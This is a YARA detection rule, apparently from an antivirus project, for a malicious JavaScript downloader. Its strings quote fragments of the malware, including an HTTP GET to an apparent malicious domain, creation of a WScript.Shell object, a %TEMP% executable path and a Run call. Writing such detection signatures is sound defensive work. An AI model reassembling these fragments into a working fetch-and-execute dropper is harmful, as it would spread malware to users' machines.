rule sig_20160330_504b950be71b595a1c00fdfc418c33c3 {
  meta:
    description = "datamaliciousorder - file 20160330_504b950be71b595a1c00fdfc418c33c3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5e8e7d6eaf7cdeff4b3a908bca53b66f784a0f0a14290db891846a6752d0af48"

  strings:
    $s1  = "D[BO](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "var Y2 = function VO() {return WScript[NT](\"WScript\"+\".Shell\");}(), PN = 11;" fullword ascii
    $s3  = "function NO(W0, P0){Y0 = Y0 * 1; return W0 - P0;};" fullword ascii
    $s4  = "if (D[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function C() {return Y2[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ftguCGns.ex\" + \"e\";};" fullword ascii
    $s6  = "function B(){return KJ + \"\";};" fullword ascii
    $s7  = "function H() {return ((IR == true) && (IR == O)) ? 1 : Y0;};" fullword ascii
    $s8  = "function E(GB){Y2[\"Run\"](GB, Y0, Y0);};" fullword ascii
    $s9  = "function X()" fullword ascii
    $s10 = "}while (P);" fullword ascii
    $s11 = "var M = new this[\"Date\"]();" fullword ascii
    $s12 = "return NO(WY, W);" fullword ascii
    $s13 = "function TP(DK) {var YF = (1, 2, 3, 4, 5, DK); return YF;};" fullword ascii
    $s14 = "function RK(){return 22;};" fullword ascii
    $s15 = "function Q(){return NT;};" fullword ascii
    $s16 = "var O = false;" fullword ascii
    $s17 = "O = true; " fullword ascii
    $s18 = "var XX = false;" fullword ascii
    $s19 = "IR = true; " fullword ascii
    $s20 = "var IR = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}